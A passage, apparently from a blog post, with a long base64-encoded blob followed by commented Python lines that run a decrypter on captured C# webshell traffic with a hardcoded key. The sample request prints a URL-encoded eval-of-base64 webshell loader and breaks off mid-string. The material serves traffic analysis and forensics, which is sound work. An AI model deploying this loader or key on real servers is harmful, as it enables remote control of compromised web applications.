ymiS/xi8jAyTUI4FsXQ8L8+KcVl6TZnibal7s+HHJ4iJpozANIfL2LSqRvAMmjedXpOG/91OQr27razoAs9c3Cre+lhn5efTuF1zCT9OCLNWu8JVqu2KlqFhd3BSkcs3ZX5PwBWOMUWqUzG6tDYigZ2iV56WFFG9LdcrpzTZXWwVvuvbw97bO3jDydR8sgtfO2NQA8KCFgpStAMKJQSyl9f+7ZvFZLUf3cPKhV7lzFUOEhwnLOX9XbxycMynOGEMLyO/R+vbcCObihRovDpkhsYw/Mefl27OwDiza1jbSl/paRUc1BoUqSVaAX9JPV2j2t1kZIvwka1M8CXZiQe0BRAxP06Oc/s8JyLJe+1dLdhSUy2VteXacdKzVJIm5NsGXnFIpMyLT/ys/Nz5nUYPUDA9+krjXltjrnwmiuwpPxZBJxBayHz+fA3bUWyszfpgHURsdAAx0JUoHtnYph9oHxF6/+YPrhIvJCl+42nDepLkrfP9/ezbXIuPtxhT0ZBc3IkM4ZwXzxStYBQMG0olApRTzjgth8IPaK0srvi4llJYfXblA36/3ZGzSl+s4xGNHSh/yN0+zR0Bae+qu7lwZEGesHuaIQ3UdD+B17mLQLQzfucO0mdWBBtSyZjXSx/e/VRluJAqNMNnDXe+u2uFNAXcFQqmz7GsAf9V7crYa89g8QZcykZyjKHWaeeb/0o4lLvZfDRnWyLaT9vywYq6iTtDy2WKRZx93EmP/qfKRpqkBk3K64R3wl7kY+RghR993zmK5k5GFazEZYopW06L0KZ2ldCZ6MtNaksZUjvusaA1DaraZ+VlqvYdFWaF9NhPn9NMppv1D+HMvz0cPWtbY3XiK/q8Y+GiGzhPmjCUwdTXJuGTkeRUKDOyq4LZKmlwUtoXhXcEU82KdwEDSBO38J5Gr+iq189hTTpgENpIHbm/1pPweA8g9W6lAkMMSD/TQGS1Dyk/0Vyzg+a68HBquyfNI7ZRcei+96ifPTWJJW8XL+Z2c0ZjVBGhhvmwMT+2nPUzx3+6CKW/tOOECJtj+LeRhILL2b584R8JLaTuO247296QX3x8EP4l2ALWSK1xjgN8zeHurSwHbPpxU2UHngadaYyumtkw5cOMuuuf85Wk6Pgqu9FBvryX6fx+CufOJW9Yzmq8xsjhFHTl9R2xALpbkgAnAbG+jzkr3hFKuY02QC9/VugLLyvcFM6LRKWQIny1dGTLSccivL3dCdQqFDDMH4s6y3YxQ3aaRosegCTSKIPStKqyKAbN8HLxrbB98rl1ZQagX76EH85B2wzWJJqkfvviGGs9pXeNI2QzRTtjBOt/dYnatjGoojBzvAlA4WIj8qq3VjBJnQi6XN4FNuuQOV3UFroNcjTp+9gje41h1F82gRBkwumQ8NRUmUbRg+lk/9Ke9JZQn8jkvEhF/eQ1J+Wk+iyRx83z1NEuX2WkaLd8tr4UyyX2dvU1MzR5+voH8pCvuCJ0wuLUPMOUZ5GtmzC/FwjcrOmNIyl3rpDGb1Dlh7EAnj6MXIbvBuDf8kq0veHzNz3bcHHvprcDQcv1azeH5bojl454qwzMtjxt+iJIS3KwZ92+ztT3WPi23W1vwZn1oJqKoirHdLNl0i1ZeZIwVWuz8aS2eLEvGn+KonWlHtLnJkVC5+PeAStxXIadkB+CNVYUmduyrzlg5xxCxvZ4Or6wFqeSkNGgX0JS5C0ijEAjJi5vqFxOeW3y+BbvZ3WjcE5xmJui/EuE9J6XcGfSIedNhfLhZg171lQddikKaWDXFxjqZxikmZa0Gia6Wq2ecQVyZSut3T5gafiCmMDFNzxGoHnIhJ+1AEUzWR3zxEJDKf0IlkASW90b5NOC+KApUpuOH9L0qq3trAQcNoENiSVKtlytk2Ijx+srSMnuOUp3fWYoF1IuBwxEfOYlWTVYAmSoqo0e3pKbbVPu8IlxEPnfsXzlXp0icV0klxV5N3WJYiFIv5q+NukFJpLAng9HG5wJ81Q1l+GRe6xgsSTUQofnNvIui2JKzO1ycwPzk4+QX9ZydTNuKFYRA5o93F6OUXDDrSN0+HtOGr483VwzgWNuTe332TEmYiimTRPi7QIs1rObvVBan/lrVWkkRUx6Dr5NFqjvlaBFtnYVnmNQoQs8jgefeDHQ9E+wqt0cWn5HNRkiko8soxuB29+Egdgv6hXuBrUPmxfr3JbTNUbx/gjrT1i1TDB09MLZY3MxJrnNe1kq4YL2kKVOX18NrHeU76vQ5NmVwO95ncoSwA5Ghes8z7aMB07JWlE8KGPdIffZq52OVOgzNnertQokWlS7rXifH+F6hVe0SkvRype9jrZds9CZKOt8twry2T4MdYLZQXQTjHQGrCs5Qtz7EC0XX+dMtgdmuhepH2tRQDOkpDvBuvp9W2bEU6BJUEXSOrMC9ylU97796fpsIaDzDZooTwpRPUjR+KrSpsLoyh2VIbm4kFZDUzh5sqxxsjztuNEr6MmSvbkZruLO43/BKWa2ZzFShGu0oHJ5usxpTlA2sAK5R9WkEIUTc/EVGDfGwSitlfBN7wlxPSL4TEI//ccPC/+sLRLE7EJGR7UF5jttrL1oAPJpPW6eLgirEtKuw9pRc2fdQCK3zcw7VPWqZmhIVdF98fyZqHtqoRyHDEF+jtvzfQRTGBx6m1J1qOCkX8Zb+nZtWTBJ0gB4GRGnKQkzFZSQfxawQ54aeoF3+jMMLd31RE9NyV0sJT+2pdYahiUVCvDOdty1uKqldvDuOByUqaCmVfRNhgfx63UDSpcGFBbM02H67QatBK7zvYUGllwnDgTqshixQfg53f0JDNQTOWBghCuK5qoEbEOlocznmEZ8f2D9FmoxQBdCRgSn5FdSW4qcpAn/XSldVG42QFGbKmFyzYX04EN6QniXFXFGcEgNcZHYVJiTca475PBNrGneD+73QeUivw6dWNcyvc+i65uZiJauBMXrSxU4IUj2YAsgd6qU4ghOX3cgivBi0Tzhi/yrO7XD7S4GPOnuupjWwtYvbNj7yXbHECdEwsFczfw3t5K5/4aBHV0EciD5aNKckunvnfo7zU+ORwHHyJp96Ool96wWtjpsPDrP8Mzxl+82A0GODGEq8h8ZCVcXXDzbKNQZSYRl7hVSBa2+lu48X+U3q9y3qDGI8lvMrBuw8FjHfNzXySErm1PLW8Cdm5XlcCuIO/1gdiSDoAK6czWH2ejabkUdj7s3LibDp2QA2sXLv71Bc90hvWq/Yw6/ihboixhYn9NoT5ezK0w+LlBRA3XH7fWH+1tA7XJ3QYTXsSjVXma/DjVWrCdLkAlBK3UPX3VPqWUIBfrBiLsm7iRsIVrIMH0Hfrm0d5tM9fXcu06PFyjSCMjEKbOvMeWZ3T3u/py672fcfEFYDTzvz6e8PbpVemaD6J6/mndHD60S2+u4StqkhP90rILjwaMUkdlave78ET/OPwKvPjwkkIVyg2O2QHU8LdxXOVoRiLXOuUiyylfpkBY0ZrT1/c4Xa1UlDBHEQHNAqYJbF0uRsszDoLDeL8bfTsdzbfrvCfGt3vM6NHx9atEVh27EKawbW9VoQw+RWQ6/ED3tP8PViq5knOih0YRYbKWeKvoxjhi6faj4jyt7Yj7FKRcFZ/fOpegaqL0T/qXdkOXBzBs1yOlWCZeHykDer9L5uMCdK6YEshRoPnikI2uyj66mQjpDI6B+otpdDpE/jwS5+Ss0Q0eOOOev1Ie4aZGWa7USvBcRaEDqawvgtqthFgpB5fU/nqBifctO/b6v8BSGWrzGLTWMY8KFssDDototDWZq1a7WSjP4Q2LxGfLytCu8BGtffnRhVKZm2okRoxl2Rlo+InMWE5MU0EY8pxYWOPL9cJX/bN4UAEE+QTiUZzRfNK9AbYtUkQGnPc2P5Nbhdb9oWQ1no4MyRAefssjjnh+5FD59P6fWOsl58bCcPQmP3HPoaHyFOznMSwq0LieBFLew2r7yN68v2TFmRhQo5rB3IBy9+MO91QHZO5/9CHrK0EJMeXveFkZK1cBXauuyMgrbEDZPWCbtgFww715gkTsozMGsYIiaX8d9PrgrU2E6AejLVBnNIgTl2VYUhZKIdGopNTlcCiPLfkrsdyVjYSnzWEsfP6TCwIlpgLB0RzdQoR3fus+foxivBlHhxfr0EB8oQlxjK5Y6sTtunYZkDlWNseRlA88iVTn1Mz8H9/d6pV4CXR4/Eeu8JGGEdWb/nGZ2JFszlPiCqcsKF3x9cZPXEqknoML+t8zhSDDBb09VKs/fpUKmVNDVUEoO0JSp+ZtazpkvLmXbhd+PkpuXQDb9pQZi8wHUAX0F+h9T/zvYDs6RgNacjQ/Kspz45lUey0lBfYSVZrk5OxUp6PdRSZ3jg6F65y7Evvl02fYUoqCw3C1cFjmnXW/uSsF1SSmVvblP1QtxKXatawSfmCz9NYEmjJupgcqRaWMPaIyMCMNn/XwaYRg+b9FKNBYCzYNeXgd2DUkuyl+kOYuyluGIUrHPM/VLHufArtXWK7KZI5e/+Hne0Vn5jdfHuGdpGQ5E04kPtNW5E7Oi/Kg4XMb4h8BaXpKWL1n/BQ9BWSRC6y8tvquuG4tsbxb87tZ+oHrVPSh8jTgHRXIU4fp8ZQ7X20ibTEF8ujGaLSOwnq5A79IG2Q4fDawyaV4FyPYw+XsB2RF1ShH3mlca2YqKFb6qWEo1LmTdq3vcndByg8ptzh1y7BhS6TIxfpopER6SPL916XYqff5HdVrgMO0CllA4dPyB/APVLmpLCoEucNXlkl/kpt7cpAihWoiTTVUvZHS+uK6F9Kpsa9NiZBjr8G/SRqaKYnuomCaIx+jg41oCutR2bf+bpQ2PhqOefNsarn/2t24Q0Bj31EcS1ZFhcglf518h8i1tOuCHrjMGND3epqSqzzEmxyxlk5kb1/XSblwCTlazVLqH7UpIudCuAdbOlf6bUjqU7DvVfU+YJlSi/2Y3VvCPgSPkDB36V/UzUq9lldD8R1OvN84tx3Qll1j4PfYevxDjcdxJkafplbUTKHosRIz/6CMO2salCxQwq1p5ysKLZsvXEt68f7lxSPeGXIYU/mHbNqjNuT0NOopGJ5DES+iKnop6voCwZoTE+taCMNtYrhM5jETQSgJq3ZHKJYOiR2uKfF3f1okVuPdedIXtsl8wlU13wpiaOK5pPNFwAEyF9lLFHrUujy33XSmwpWOTMzDDVxu5ICF5tcjgeb0NufDZ1PvxAJhZJ8VlMQYqMFExLrfezpdXhNdJoSCBHc+q3JQsciXTmPlNqlDo6272DlINaCgVzR4N+Xq5UdsncyyH1WBDYVQ89Y0D9KrC69G5H9g1OcpDIU9LlXJ6OWbrnpeM+Vz62c+jyrWJfLe9fm7GUJ8QbZfJaqyCJivrf5tWrdVQmVR6JcGSNN2vbiXamTJEHVJ5iLps4Z1cWNZ+eyHBYoWK1Xk/0eiajI+lCOANRV03JgOMdDvFJeULE2NtHpRtH/ksPakywVIvV+f9nkpOFUnrvV7/J3K3GBRYvIhjhRzhL2uRf0l98k1gfCu6o25TRqob4wBU8RkaZ2Mcd7pP1KKUdYRzR2E4FB/qc+uYRZB4LAsp3WqppLt1cx+6YKImDE+gkbn9Ie1YYDqm04gdWinxQQLa5c///RIieC3Q1cOHwugau8XlwYWlRiwgVnihKnT5t8WwyKdthoOy+FMwilaXYd+CFb6jmuG2lrNB06MVRF2MnK8XHvzbqB3P10TW/pydi1WbK/vfy51oY6crjVNvRp86P3KBya1Lgad2BYSI6HhD+eSyETo6QSSpCm5/3y+qyZoW3M56wfnXVWgWEsJhRtZ+ho9snbQEiHpJCo3vmI4TxuFxstO+5bKkl8ruaC1DTad737gjVH9bEFW1zgWXST8PoFVd60hvEUPbYSooZphiLRCn66KlyJH1Gl05pKVfjMBINDIG5wccMTcM9Rzky1X7877Wgu2dnP7MTdiMBKLsxEAEuCawAl1zYKD6dADCyFCOU5jPoU+D8QuOUO5m4H9boEBVsPfSp6bd8rvmERND1ngfIzZPeHUnDOMJhsLk0JbFcwxfEYjO371EvKLhfyVAcJ4zeLPaDU6rYlMft9Uooytd+iyCv7+GeF5LnDT63E9mSjFzHMayeeuWu5fpfdKiRyeS5vf9aSN3FCJ2bCz66GHznjJDM/cK+MaiqgQHsE1DIzw6MzkL5mKI1oRbC0SaRcsckWSoOWmPQLG+iWiWYBEDnkToZf+DD5a8ClYP2NJy2jkQ+MBTIrqwlNcGYGwXLEj6RR9ZaFqvwl+iu57GxKhR3uUI10kT1xpjeU1wwTnfh+3H1Z2woJ+L4rEvfjis85NPhSuZmveYMiCqA3UPpRIxM/yCDP+lhF+fCd4LmjtUqdc1Hx8IL37O6TWxgFLUX71dWC+UIf6R79fT/k0bx2uYh1uPTRdJsjlcDkX7U/U8Z0kEq17q7E3Zng4DRMUd3xAGHQYDKrHiPXyeAuKDftH07Uds7xXSEsnpD0lMnPlZnKcLP03Q3ghchvno7TeTd8OK7aOoSLN49TIGJuII0rfx/c1vGtQoIaY1RFWJlqkPoaoeIAUMwNLeUoXUp8cdPYkYHt+rQR/y7K6CNcD6+b5M/qUg4xo2QbaAZJVMYFodHOzB6TWyLnIb6pYdJ2+Vv26UmFYpa5wddyjTSWs4D9Hg0uyMWYJxIoQ/ZN1VT2QnXIIW2Fnp4G255cfVD/qX6gMR+2dEbgaklvgLC4vZLROipUV8cxU9DDw41UAPy4cbbs3Z9ztq9ozefXXFfEk/WxB6t4vVZUpSs0001HKBWlFVV9s5JuIYS97u8I9ccO1EpaBRFBsZYkxXVFTv7nwAWIKPj0rxYbxqB5YEYGpLAmqz52obhGK8tCkKdEuQh0BJ/aQf15vtGghXqJSDa9YxLgvC1LZjeZ3B6uL4/B5kXZzxe2mShYlAfd+Ech8TW7vfovnu+4SCgzfmApjphNS55QPMklWSubSirJmKSFdAbOZMcSiXLfE4pDng+8mFHp3q1FxfXaLQG5Hlxd5rGg6dFlFNvCdbscnEts9eYKSIdJ1ReOZEIJFT3qwsXAfQIBq20moqoUyglWJjmwhO6jjbI0dVNF3zjlNVtUM4LcppWHmYKZ7ZmUg59rxuF3IK1sPJ7FFAeaXjMxnv6OCMdWGdCOo2w4CPV0H3ku3BxaQKQ0oERej8Y1uMrgervEhrV+2aKfQEmYBBMmZsGj7qQkuR/FdPH+aQx69k9c227DJV8S6JeHmXUnsygJIDbm/7S+vBWxYox7J3shcEYYjNNPMa6PYmHTAROgdkAi8NU0LT6DHKI5+/8U1CHYubmCMJj/14OvL+4ipK0XzxXqZ3ky9pvV2nvWZFkHb8supFdflWJOl2DL8WZAscn0hdh1jak5imbittRRPLvvKBVkI4T3wvm1CxIV93wlPp2NOT5IZ4GO+NcsRwJwhwiEv9++W/TUP7//55GsST/tjT3bTlefyj5gG48GHzIEqgSjQiHpiWr84EPsNWsrPL4Z75QO+7SyRD4srIncx9gdVm5jZRX1sM7kENzTCDpdcSYSf0ovKUASmbtZPFnMH/5jNBOPOHvqfodPeTptfS0ewNWnQSjUq6GhXQr+VcPAsMwjO+NRiAv8yVKsp5cgpgXH82+s+jgrtNQUGmZ8CiXuSj488OtxF31Cou97CMubUMUtTS9SQx3EHP9T4VEat8CVwJElm+DUhmC+5D9y4mmo43lKGOv7rUlsKKjB2rHChf6XKKInc962/AEoK9MdpoEQuEumO7nhThOxrhWrRPims0y+c5sN3ULuwsvbFqUtX5yo0WVhUSwc8Lp4+NR8GVYZ2aBXyF0g5mTCrjYcAge7hj4n/eMmWoq/RapiuRgRgID/duwKzKTrWQJiLi/faJQ/GARr3MOGXCS6PLH8+CS3Un5G70AVVAKJ1OD+7qxk88ExpuvZJmCtbJd+BaUQ1xNUJJaLhcmYzetqMCueg1l/RGlliBT9ag4NCPC+bmMOssqIHd70k85L9pq6iwQUIbADTkJTqjPiQyTo+y5lL2M1t/Fwjh5oOOtiuwFRq9GeS5GKwlbNDAJnRku8Zf6Ho2yPTh8uXDpVPXBfybyC2Vss1l3Um6GEoJzh8Xm4qgTtVh0htOrvS0PX81H7HSTOc5GNqQjOyhWjKSk9wck2Tt8e3R91PibVtsvnbvJxZlB3uWh+zqiYIIDKjArSDMjZWCgML0eJ2yLcg3S8y3WEwPAUC1P6KV8bhPB6dgqZ/cG8UMgo/dA0Q/y5/7QA/nzw6Zwq4aJy9sl1uhyzSwveV8bp8DIM45dZEa9feXnKpgrReVEGmy2jqS6gS0UQnP9CniTKBf31Fp97i3UVSSNfk5r8xRglXGPXD/OY74p5tZpTJ2GgxnLabyhpkkZ83mLMBkehN/W2mk1YuPX2e9yOYrhF1iZn5HxsVbVlbye1qtpEKHuhECbSAhKi86KGvjw74ZiP9FNocPAPwE9saLVElHkUoFqKjniMDC3vuqNsIJ83/vx0jGuTx7M2Js5fNB4QDJpTdfhrEkZzJx+M1uWygYuKfOa+r3K9quBJHWrBDEmWn2xQz3uFODWiCOXEDPgKTrlRXIJr4oqr5gvDaJKE9yImbnucKrVpjHFs2x6MixRtodYUADtrBV90I0b4eOxa4OhWOQN08/9ZP1kQhiaxROzWmGUcSK5i+H8SFGTa8uZqBbhXD9v/O4jCaVODgOE1pVob9m0K05V2B4QKcNMRwA6H/rUkwLMuZRYUx7RR09U6jBwh/3zJ4NwoQDG6ZWsX/o7etet6//S3gmK402sT8fObiDSo1Wz2UeGgWTehv7+WepyI7RcJeanus/PwnVRPsCRk7kwc9ToWwdgdzaa6vxp0F1vJdCvXZctFE+CSZQHwpPwpBSJO8VIXijxH4/stDWbqbxJsj4aKhmuLNxzzZWCiGWIyfRuX24W0c2MjfHK2YpP7Kbw40VRpCJz5bdDXEQ8C1J/Y/SzFbmrLMlX4Ns39CKE+pnQaS1vX3U9IqhK4TdpugGdot9ednKzC61P3GuHP21Idz8DuZCJmF3kB1w4iOozJqPLnd2614zlP0rMG62V1BjWpp9E0ioH3rnBvMP9KO8x/BQHHColIL7THXsVefHFP/sFBHMOfsoDuCM4jLdmlWxThY01926RHZpirFOq9wTdvYfSkA2BQt7DnIqbAHzwpJcS/s5TF9vOX/4HTZbLW8G0OOZVU1Lf5PwFBhMqq+IPQKmRbDY48wWTRpiM0rOGAnEqji/pQSbjgbCLHl30dtwjBEnbEaYFCcR6nC7x64nmvLy61Mgvr5g3QmUdYcfsgqr7onEPibq2vFEyP+HMPiwNfH328AiG+r7nJv8xIs67RHzfCtnlMOt/twiAbKTjNSAVEpKaP3L4UtvEWeDjGeqSzUzH6ReKVp3UtnCxbihpo5x2K0LM4ifrk+ZrdmlYpdu+DQ0+maG47A7Fdl+yvmEpxexaWp5NCPhp1jLIonpSnU/EjE3W5hjr4jEJcUVBP3sHcLOWVUWI+dhbnOPnyv+ZxD+DdppGF1JxY0hGILfwn5sbpBDuoXjnwcpBsoSLJz2rMH2tHdBEUt+cQwFLdCnGxkNHqY+pPsw2UsShYspQmWhSE9hglGqsh2NWLmCtR9DdwFxEfv+W46hJLDAFR9cRfRc26X4l39pNrck+ys8dz1c3zJwnO3zSBCSSVYSGByE/wxk2zXgJ5gca5wtYEK1M+gfdIHK4yotr7WWh0IOc1cFzWyRLN/X6As4abhvm+GjVfmzSqhFlKkSfidcxRKwc8lyotPzuq9fnFaIZw5HRGYrnfq0a6aHkKE8PhSNVmJEu0J23iLUNfGyLmXMkJrcsMOsN66b5bP/aUoAsz7MeVYJSaGj9vSGlKLmG90Kkrqyk+03VnAMGfXu3t7jeg1Vjl/UcbleRz3GBEg0ccpWlfRUf+l+Pw3ttM767v/b0cXKyA7WSRb3wV149vO1uvbCvjHzxeyuf8iVK/LFZw6BbDxr1hVHu6RFMSkqBviIR/cUGvdGSULvlYeKYgsR2zFYBnv9c4kArpdmxg64z9B4suirS1t0oYebTHSMgzb7wfDOOqDNWg3YdQRnhlxj4GFqk6b//kjuLkp4bW622lBYWdIN/UVjmZo26IScjKRk18Wa5xP+rg1qP1agzGgiXBdlMI5gcA0RC/xhK3T7mWy0kElYGFrbCP/nY5kGN94eVYbX62lk43kcyIeQV4Gj2nI1Be4Ixil+B5QcIDnaJIR48wjAcr0BiQGEYRtWLl6Vo1dIsV0YjIBh4i33i+X4MFwx7hQ3i3dGzKpVpsrXmHXqn6Cr2Pjl3fZs+HEe2Npdf3/eSxnAEYi6rv/+48UWO2rwVs1mBHRw4EbP3jC0t3PO4I7T+duu4uqsE6R9XsQX+xaqJm7XjXZBRg+J8OEpW3ihixHZ2UH09cwPpyagX0OXrPZBeRqydbWiwhxDz8c9iiHf+6KicT7nO02PNwMiT7xCWPQ/Id8QGhEmcgqp44VVTKulb/H+u5idbKsLn/yrUk64zxtihW95zNf5BgGetaYSA+6dUdg8A34MXYSgfAsHYqf3H3vJzVry9o8IAyHPnNdSrp0rFU+Z8bF3m5B3WbP9l0kHiIkr0KWOk/8lV+WGJ4NLSHk8o75p7arhQnlYIFo2xulIUP5jpV3tVluUuwPxIEpJCxYEd5z7Ex07XQClTFBwXrlMBjVRKCDkJDEtlvHSK1H0xrv5fPI9hvDCP9HE+RDspd30Rx9vEJfCLqzCIA4yyUQQeCqiuEXhyuLrE60cLqXzDoctGlXLkaU5BhnqiKiHPyz1hUS9IXlbdsNia202gpNzQNlTJfM9FoJVQJrvFh5XetCdSnAomRV+3lELSFUEGR6guIy8Z1mQoIC0RjzkVCt9/KAMhDz6n3D7I80AHpCnaD9yWcCx80jw0qAIIyVCnTB59m0aHvpVLHYO1JGHpZe6ICGqkTRYZTwC2i4tpJ1IkPw5GojfA6HlmFhM17sbujPddq1OsfjMRgsL9STJCuGoFLWA8wjsPlx46T9oKLfS3k8sotlxzD2Nqwy5FjSreEpHtRZBjc8tx3UHxx/YIy4nvQcQfOzoVDBcvNpEvjWcd9CNguAZhRtsg9sMQYHknS9nzNgTBBndOU+Gsl4MUGdZ8cfxNwlxm3AjsaN+QyKnf7Bohj9zX+aOpD/5P+VV1Q22K4t0PnzKfS8ljYH2Wkk+D0MqHqfMEplus1CUIRGMtklJtRUeRD5x3Jd6BdE2gnaFnnAsXK0IloLXWxcRxXKP3xM+3UAkEWyGI7WoBgYhRURcu2Wc/bk1Gjhpy+kiqr8tedLFg9H7IaStAWRgsYhdJUuv4t5I6qfStPxOgUVdmAt8wC9SNi+Vg4QdyYpOTNCbpcEVbnbyfTi238gJi8p7cYAL2HdrhKY4Ci7EE/vzJjfX6oaJgfhWm9e8s0Yl8USTO7+LzwCS/+/Y2THnrt8m5Fw/AUjscsJ1dEtiHd9COX+Y0/9BkpQy4LF+aBUgi5QfGal3Sxw9Zkz9LUBsSoxTVQEmE8uGF5nfa/S3gG5Mm2f4TG6ojMmaUIn4KrAtjQkQEiweHb4Nn6JEiNkESk8sXOUV2VXq7C+kAutM1EVvdL8KAVfNJaCFhaQY0xpbuOOkyVYcCbkzQXr73YhW//hKi1fHnKTXY4Wc4IfRJI56CZ1rL/QNm/hYpgSUvYSrFfBjw2b2aKcq1vp1uS1WPnpkRjm1ZjWIBmHhUzr26r1/dfBlGsXmy7Ha8uG4YwipXIeznBo6eC/PGrT5rWQE412eoqoLTQEMWXv3Yfhjj4qFOz/ozPk83InuLV6S8ODrR3HopCIGtaZt95wm7XIgBNRubvYRw5yhy9fern+GA41uWMXHQOiLc+cBeMhlTLX0LQR8CgJFSWcWPAQMq5HI8H1zfrav1ZfNzPi5pxpieODkWmKIpAGDG1qHe+R7OPm49gPy9atMUAJjDT+kcAiyYtYgpCCu9m8Kg5Cvp2alZ5aDYvOjD5ZDc+q5QPzfz4qxdnYs+EheAdekuzcudBXdYEFeusJ6uyjLf/JTxoZxL4pdiyMrO/OEyHJviu2EaIkZzd14zdwQBtpLIonG8EbdYdhEu37KUufLb+RYtoGlER7dqjLxyfK3l8jK/jNKDwWUJVNUEeZ2vitX7y+HZjxAf0WquRn2Wrab4kfs3gr7UzxxxeUdDWqfTj/Vv7zNTkTK1E8WU74gKPtNax+YDOgOgWrBDgudMt8CwUZDLCE7KqQW2obpAjx9C843z/SxqtVJ4qpVHrjbvP8RXwb7ZPrYy0aU5Q4Q3STKSPNkshyreaRIDoSvPPHTzL+9JxZ/WWINk//mUW4zTdOtCXdMAeL6GEaJvKytWQvbLYbuZv/fjCZqrR8FeGHgTUVgT+nbEDJkFAWJxkmmU6f1dvuZc7R6M7AR3kbn6MM4QSYZBeIYSdRqZBs41nn3VisyTGu07JgRMf1Y5/DaT5J1PiDdz4k8f1/5WsBxbk7faXsaPHRfJuE8tOoXX4lJCbpzkhSKOu9ilrUTW1LAxmFkxOPJs5wj+C9cy1CDbEYiu0CdAUNnJ6Isg/Y4oSDXDcgzxunBMbDQGg/vgP5bjBrYlR9uau+Mo2BNjRJQFoeHPVF95kfVice0SLC0nhHkIxTscL8S+QtaK9cvhyPt9X7CRkP8LyUm+aJMoPzX9j+HVBUH4M8VQGBrmws9vjnwW8XGeOPJBLmPJla/j22wcVjn9w1+4NbXygJW73eHaXe0FQu4g0ty7mjwn3NmNyKOypesVt7LFxg/O41kszXhSCMLQcwOSVWzgPoqCw+SN7qyvDOKfQze139czgBXTCQ+drybBDl6mm0APKAXZEmDIdAn15VOhhws/n5Wu6jHS5HULs4MQd5xIkBlO8y1jRuvLPUPlHz80kPgsucEEGLKN4QxROK8a8tlJP95G5rllEcdC4yCVCOXhRIvAOdZ1XlexOjXbhQVbkFxjME5aZL4duGEdXX7JjdDc1t0BWNtZt3fnlIunB/S0dJsyJ19BydgMRZJXlh+nEr0o/FakbVUZj8cv1nTsZeAbpIg/zIjJOfF2OHj2XdANY7ERvepV8fU5jt/m5WoqjTOmG5Z7X9oAXwL247h7YY0aAngKnnPBr0XLwcoWu5y+SKNPVgktdJldRyL90pC4d0nzLBmAqTlj9z98pOLzqLP5LrxTC67UomovQG1Aix4pPeaUmApyQ44O0EtcpyX+rhmmlCI+07ZDA2My2npBvjWk2Wcs2aeAxXtQiYSrvDKPXUddXg1OdT93xdeJzvorDdKdr2gGPia9TIr6U7qI8RyBbxPI0NXKoZU9ZdW1f5q/A/wuQfauwcoPYixhKYaW2NSbp/YR+sIODH4t0i80+tfjwKYZ30SU4RllmRwN4MR/CXpsi9YjWLazMkCJeJAVid9AqZPo2GNnxNkZFXiWtjvd4UrzkAlnFQwqhYBRkpg7ECT+Qyi0zwbPYr1MU4ZMvNBcC0U6pWshZ9fdWY5hCtkqVsw1ccn5SlytIyksf+BXeeQw9dpg45AHVQQ2rkp8uFkWF3Ero2QMIYLTZHSoKMxVvya7Z5ZyAs9qRDh/sKfTS1XYWExRx5LsFuoyua5QzGvEkXoTYlYMtnupE5gsqRTOXcFobXj5kjvOxvgWwqMecckvWqKzfk763xpt93Tm92SZJO0mqYnmAq6kd5OYkVE9vvMyiIES4ijW1GWkNkQjYaaafvnfNL2xJ2Uu/ZVHrqPafq79ILiyQCcExTq5Np1ent26WZ93kNqPJrv1n/9yDPmMjhRPyM4v6DS2DwWFdoWDYSE4UKjseK8kbeFzV3BFkT1V5hWwsaZ3kSo6CRCvC8RBE+yuoUlxn79zQYay7dRTp1dvIeLE3ZrIyZyuysRjffsyhxg1trh5myPFLMsSPnrmD/sVyF7EMHkfdxWTwN0R1YKxMw3JrfirXgCWTO2fJalWXgJWcravGrbhD0l5km3tf8L4Os/kiPxxvVyHmzv/GkySnWPgK1BUgnN4H1hqacotJk9j43GFn0sP+VnzuEpReiY0d0Xxr4qW/9Ys5bUO7YXWVqPvvwcCYD9doztghiBxebGTeURjsGtamY6HSr4kw8KvfpaoXnipuNJPCiNuHx/syzfNPuT6YtISJnHcl1D9au24eN9amzvsyStgBAq54SsVHXSNO5X+mppbcmsig0aJo6qlKSEYa5gdl8401BsuVy/Y/0tN5gFjWVjKo/l2fBe+C4+End+LQ1/ggBGaGATpPBRct2M/iDJ6OAubnQEGzslI8EmtWANjRpBlL50awQrxJaYVtVcw9ztDOe7thI7JVMtaOyg9RX6L7D3ZzpKzl+6+rmIMi9UMY6f5l8FlEpAWagf0A80lUB/2ZjZ34SOgwHsvPWir4XfjYk0ytaxw8RLBp5I0zuwknOy+y08afSh6NIROp6IyfvllEcDzsPWGCkPsjym6EEWM3SukK2QC7x2/nPekpLuE1J&#x27;)</span><br><span class="line">    # print(data)</span><br><span class="line">    # data = decrypter.decrypt_res_payload(b&#x27;11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC&#x27;)</span><br><span class="line">    # print(data)</span><br><span class="line"></span><br><span class="line">    # decrypter = CSHAP_EVAL_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    # data = decrypter.decrypt_req_payload(</span><br><span class="line">    #     b&#x27;pass=eval%28System.Text.Encoding.Default.GetString%28System.Convert.FromBase64String%28HttpUtility.UrlDecode%28%27ICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBhcHBjb250ZXh0ID0gSHR0cENvbnRleHQuQ3VycmVudDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5BcHBsaWNhdGlvbi5SZW1vdmUoIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIga2V5ID0gIjNjNmUwYjhhOWMxNTIyNGEiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFzcyA9ICJrZXkiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llTmFtZSA9ICJzZXNzaW9uS2V5IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGNvb2tpZVZhbHVlID0gYXBwY29udGV4dC5SZXF1ZXN0LkNvb2tpZXMuR2V0KGNvb2tpZU5hbWUpID09IG51bGwgPyAiIiA6IGFwcGNvbnRleHQuUmVxdWVzdC5Db29raWVzLkdldChjb29raWVOYW1lKS5WYWx1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG1kNSA9IFN5c3RlbS5CaXRDb252ZXJ0ZXIuVG9TdHJpbmcobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1Q3J5cHRvU2VydmljZVByb3ZpZGVyKCkuQ29tcHV0ZUhhc2goU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhwYXNzICsga2V5KSkpLlJlcGxhY2UoIi0i